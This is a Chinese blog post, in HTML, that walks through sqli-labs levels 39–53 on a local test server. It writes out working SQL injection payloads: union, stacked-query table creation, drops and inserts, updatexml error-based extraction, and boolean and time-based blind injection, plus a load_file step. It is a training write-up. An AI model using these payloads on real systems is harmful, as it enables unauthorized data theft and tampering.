@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+	<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+    <meta name="description" content="龅牙晴在 Github 上的个人博客">
+    <meta name="keyword" content="安全，漏洞挖掘，漏洞复现">
+    <meta name="theme-color" content="#600090">
+    <meta name="msapplication-navbutton-color" content="#600090">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="#600090">
+    <link rel="shortcut icon" href="https://cdn4.iconfinder.com/data/icons/ionicons/512/icon-person-128.png">
+    <link rel="alternate" type="application/atom+xml" title="折戟" href="/atom.xml">
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css">
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.css">
+    <title>
+        
+        Sqli-lab实验Task3（less39-53）｜R_song&#39;s blog
+        
+    </title>
+
+    <link rel="canonical" href="http://rliyuqing.github.io/2019/04/15/8. Sqli-lab实验Task3（less39-53）/">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/blog-style.css">
+
+    <!-- Pygments Github CSS -->
+    <link rel="stylesheet" href="/css/syntax.css">
+</head>
+
+<style>
+
+    header.intro-header {
+        background-image: url('http://upload-images.jianshu.io/upload_images/6269327-c23742a390edde52.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240')
+    }
+</style>
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="" class="animated fadeIn">
+<!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top " id="nav-top" data-ispost="true" data-istags="false
+" data-ishome="false">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand animated pulse" href="/">
+                <span class="brand-logo">
+                    折戟
+                </span>
+                's Blog
+            </a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <!-- /.navbar-collapse -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+					
+                    
+                        
+							
+                        <li>
+                            <a href="/categories/">categories</a>
+                        </li>
+							
+						
+                    
+                        
+							
+                        <li>
+                            <a href="/tags/">tags</a>
+                        </li>
+							
+						
+                    
+					
+					
+                </ul>
+            </div>
+        </div>
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+//    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+<!-- Main Content -->
+
+<!--only post-->
+
+
+<img class="wechat-title-img" src="http://upload-images.jianshu.io/upload_images/6269327-c23742a390edde52.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+
+
+<style>
+    
+    header.intro-header {
+        background-image: url('http://upload-images.jianshu.io/upload_images/6269327-c23742a390edde52.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240')
+    }
+
+    
+</style>
+
+<header class="intro-header">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1 text-center">
+                <div class="post-heading">
+                    <h1>Sqli-lab实验Task3（less39-53）</h1>
+                    
+                    <span class="meta">
+                         作者 折戟
+                        <span>
+                          日期 2019-04-15
+                         </span>
+                    </span>
+                    <div class="tags text-center">
+                        
+                        <a class="tag" href="/tags/#sqli-labs" title="sqli-labs">sqli-labs</a>
+                        
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="post-title-haojen">
+        <span>
+            Sqli-lab实验Task3（less39-53）
+        </span>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+            <!-- Post Container -->
+            <div class="col-lg-8 col-lg-offset-1 col-sm-9 post-container">
+                <h1 id="Sqli-labs实验Task3（less39-53）"><a href="#Sqli-labs实验Task3（less39-53）" class="headerlink" title="Sqli-labs实验Task3（less39-53）"></a>Sqli-labs实验Task3（less39-53）</h1><h2 id="Less-39"><a href="#Less-39" class="headerlink" title="Less-39"></a>Less-39</h2><p>这个没有闭合的，所以直接使用联合查询：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-39/?id=0 union select 1,user(),database() -- <span class="comment">#</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="Less-40"><a href="#Less-40" class="headerlink" title="Less-40"></a>Less-40</h2><p>不同的闭合，多尝试几次。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-40/?id=0<span class="string">') union select 1,user(),database() -- #</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="Less-41"><a href="#Less-41" class="headerlink" title="Less-41"></a>Less-41</h2><p>和39一样：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-41/?id=0 union select 1,user(),database() -- <span class="comment">#</span></span><br></pre></td></tr></table></figure></p>
+<p>但是page-3里的肯定不会这么简单，看了看page-3的标题，这是叠加注入，那就得在搞点其他的测试了，就用less-41来试一试：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-41/?id=1;create table <span class="built_in">test</span> like users;-- <span class="comment">#</span></span><br></pre></td></tr></table></figure></p>
+<p>创建一个和users结构一样的表test。<br><img src="https://upload-images.jianshu.io/upload_images/6269327-6d269fb93c781bd8.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1.PNG"><br>同理我们可以对表数据进行更新，比如更改用户密码，删除数据库，或者利用load_file函数上传文件，比如php文件。。。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-41/?id=1;select load_file(<span class="string">'c:/tmpupbbn.php'</span>);</span><br></pre></td></tr></table></figure></p>
+<h2 id="Less-42"><a href="#Less-42" class="headerlink" title="Less-42"></a>Less-42</h2><p>这里显示的是登陆框，结合这里的叠加注入，我们继续尝试新姿势。<br>登录框用户名随便填，密码填：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ a<span class="string">';create table test2 like users; --</span></span><br></pre></td></tr></table></figure></p>
+<p>创建一个test2的表。<br><img src="https://upload-images.jianshu.io/upload_images/6269327-af32e5f42bee7f97.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2.PNG"><br>同理，我们可以删除这个表，和之前的操作一样，我们用户名随便填，叠加注入写入相应的语句就行：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ a<span class="string">';drop table test2 ; --</span></span><br></pre></td></tr></table></figure></p>
+<p>其他的可以继续尝试。不同的数据库会有不同的语句，有兴趣的可以多学习。</p>
+<h2 id="Less-43"><a href="#Less-43" class="headerlink" title="Less-43"></a>Less-43</h2><p>这个和上一个差不多，不过post传参的闭合方式为单引号加括号，相应的语句稍微改一改就行。</p>
+<h2 id="Less-44"><a href="#Less-44" class="headerlink" title="Less-44"></a>Less-44</h2><p>这里和42其实相差不多，只不多这里没有了报错，但是注入语句还是一样的，我们写几个新语句大家看看。<br>插入数据：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ a’; insert into users(id,username,password) values (<span class="string">'233'</span>,<span class="string">'233'</span>,<span class="string">'233'</span>); --</span><br></pre></td></tr></table></figure></p>
+<h2 id="Less-45"><a href="#Less-45" class="headerlink" title="Less-45"></a>Less-45</h2><p>这个也一样，和43的闭合时一样的，单引号加括号，只不过这里是没有报错，会提示说你是一个傻hacker。。。但是我们自己可以去查看数据库发现自己的语句是被执行了的。</p>
+<h2 id="Less-46"><a href="#Less-46" class="headerlink" title="Less-46"></a>Less-46</h2><p>我们可以看到46的标题变了，现在我们要进行的就是order by的注入测试了，具体什么意思的。就是我们之前的sql语句最后都是limit 0,1。现在是：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ select * from users order by id;</span><br></pre></td></tr></table></figure></p>
+<p>这时候我们就不能用之前的进行访问了：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-46/?sort=1</span><br></pre></td></tr></table></figure></p>
+<p>这个传参就是sort传的就是order by的值，sort=1表示按id排序，看一下：<br><img src="https://upload-images.jianshu.io/upload_images/6269327-036d06241df614ce.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.PNG"><br>这就是我们访问上面的url看到的页面，这时候我们就可以考虑考虑如何构造order by的注入语句。Order by后面可以接上面语句呢。<br>我们可以尝试使用mysql的updatexml的函数来达到注入获取敏感信息的目的：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-46/?sort=1 and(updatexml(1,concat(0x7e,(select user())),0))</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/6269327-fd5d4a22971257c2.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="4.PNG"><br>同样我们可以更改updatexml()函数里的第二个参数里的sql语句，来获取我们想要的信息。比如：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-46/?sort=5 and(updatexml(1,concat(0x7e,(select email_id from emails <span class="built_in">limit</span> 0,1)),0))</span><br></pre></td></tr></table></figure></p>
+<h2 id="Less-47"><a href="#Less-47" class="headerlink" title="Less-47"></a>Less-47</h2><p>这个一下就猜到加了闭合。。。不要问我为什么，套路熟悉了一下就破了：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-47/?sort=1<span class="string">' and(updatexml(1,concat(0x7e,(select email_id from emails limit 0,1)),0)) -- #</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="Less-48"><a href="#Less-48" class="headerlink" title="Less-48"></a>Less-48</h2><p>这个没有报错了，这时候我们就不能用XPATH报错来获取信息了。不过可以使用盲注。<br>可以利用sort=rand(true/false)进行判断。写一下我们的注入语句：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-48/?sort=rand(ascii(left(database(),1))=115)</span><br></pre></td></tr></table></figure></p>
+<p>这是正确的情况：<br><img src="https://upload-images.jianshu.io/upload_images/6269327-feae911e0856f8ac.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="5.PNG"><br>这是错误的情况：<br><img src="https://upload-images.jianshu.io/upload_images/6269327-1bc40b2bafe10e3f.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.PNG"><br>我们可以根据正确错误的不同返回值来获取信息。<br>更多关于updatexml的注入可查看：<br><a href="http://www.freebuf.com/column/145988.html" target="_blank" rel="noopener">www.freebuf.com/column/145988.html</a></p>
+<h2 id="Less-49"><a href="#Less-49" class="headerlink" title="Less-49"></a>Less-49</h2><p>这一个无论我们输入什么得出的都是一样的，这个时候我们就不能用上面的方法了，不过可以用基于时间的盲注（单引号闭合）：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-49/?sort=1<span class="string">' and (If(ascii(substr((select username from users where id=1),1,1))=69,0,sleep(5)))-- #</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="Less-50"><a href="#Less-50" class="headerlink" title="Less-50"></a>Less-50</h2><p>从这里开始我们就开始新的，order by和叠加注入的挑战<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-50/?sort=1; insert into users values(1000,”root1”,”root1”)</span><br></pre></td></tr></table></figure></p>
+<h2 id="Less-51"><a href="#Less-51" class="headerlink" title="Less-51"></a>Less-51</h2><p>不用猜就知道加了闭合：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-51/?sort=1<span class="string">';create table test51 like users; --</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/6269327-82fd56e77b75ceb0.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="7.PNG"></p>
+<h2 id="Less-52"><a href="#Less-52" class="headerlink" title="Less-52"></a>Less-52</h2><p>这个50一样，只是没有报错，payload也一样。</p>
+<h2 id="Less-53"><a href="#Less-53" class="headerlink" title="Less-53"></a>Less-53</h2><p>这个和51一样，但是没有报错：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-53/?sort=1<span class="string">';create table test53 like users; --</span></span><br></pre></td></tr></table></figure></p>
+<p>快结束了，还有最后page 4，也会在近期写完的。</p>
+
+                <hr>
+                
+
+                <ul class="pager">
+                    
+                    
+                    <li class="next">
+                        <a href="/2019/04/15/6. Sqli-lab实验Task1（less1-22）/" data-toggle="tooltip" data-placement="top" title="Sqli-lab实验Task1（less1-22）">Next Post &rarr;</a>
+                    </li>
+                    
+                </ul>
+
+                
+
+                
+
+
+                <!--加入新的评论系统-->
+                
+            </div>
+
+            <div class="hidden-xs col-sm-3 toc-col">
+                <div class="toc-wrap">
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Sqli-labs实验Task3（less39-53）"><span class="toc-text">Sqli-labs实验Task3（less39-53）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-39"><span class="toc-text">Less-39</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-40"><span class="toc-text">Less-40</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-41"><span class="toc-text">Less-41</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-42"><span class="toc-text">Less-42</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-43"><span class="toc-text">Less-43</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-44"><span class="toc-text">Less-44</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-45"><span class="toc-text">Less-45</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-46"><span class="toc-text">Less-46</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-47"><span class="toc-text">Less-47</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-48"><span class="toc-text">Less-48</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-49"><span class="toc-text">Less-49</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-50"><span class="toc-text">Less-50</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-51"><span class="toc-text">Less-51</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-52"><span class="toc-text">Less-52</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-53"><span class="toc-text">Less-53</span></a></li></ol></li></ol>
+                </div>
+            </div>
+        </div>
+
+        <div class="row">
+            <!-- Sidebar Container -->
+
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5 class="text-center">
+                        <a href="/tags/">FEATURED TAGS</a>
+                    </h5>
+                    <div class="tags">
+                        
+                        <a class="tag" href="/tags/#sqli-labs" title="sqli-labs">sqli-labs</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+                <div style="margin-top: 20px;">
+                    <h5 class="text-center">FRIENDS</h5>
+                    <ul class="list-inline text-center">
+                        
+                        <li><a href="https://teazmh.github.io/">Tea_Mh</a></li>
+                        
+                        <li><a href="https://zheng19970225.github.io/">让子弹飞一会</a></li>
+                        
+                        <li><a href="https://luckyjq.github.io/">LuckyQ</a></li>
+                        
+                    </ul>
+                </div>
+                
+            </div>
+        </div>
+
+    </div>
+</article>
+
+
+
+
+
+
+
+<!-- Footer -->
+<!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1 text-center">
+                <br>
+                <ul class="list-inline text-center">
+                
+                
+                    <li>
+                        <a target="_blank" href="https://twitter.com/IIGHJH5O4mvbeF9?s=09">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-twitter fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+                
+                    <li>
+                        <a target="_blank" href="https://www.zhihu.com/people/rao-song-63?utm_source=qq&amp;utm_medium=social">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa  fa-stack-1x fa-inverse">知</i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+                    <li>
+                        <a target="_blank" href="http://weibo.com/u/3870422953?refer_flag=1001030001_&amp;nick=RS丶从徒手开碧根果开始">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-weibo fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                
+                    <li>
+                        <a target="_blank" href="https://github.com/rliyuqing">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; 折戟 2019
+                    <br>
+                    <span id="busuanzi_container_site_pv" style="font-size: 12px;">PV: <span id="busuanzi_value_site_pv"></span> Times</span>
+                    <br>
+                     Theme by Haojen Ma
+                </p>
+
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js"></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js"></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/blog.js"></script>
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("http://rliyuqing.github.io/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("//cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+<!-- Google Analytics -->
+
+
+
+<!-- Baidu Tongji -->
+
+
+<!-- swiftype -->
+<script type="text/javascript">
+  (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
+  (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
+  e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
+  })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');
+
+  _st('install','','2.0.0');
+</script>
+
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<!--wechat title img-->
+<img class="wechat-title-img" src="http://upload-images.jianshu.io/upload_images/6269327-4c7992ea7ad8aea9.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+
+<script type="text/javascript"
+color="0,0,0" opacity='0.4' zIndex="-2" count="66" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+	
+
+
+</body>
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/love.js"></script>
+</html>
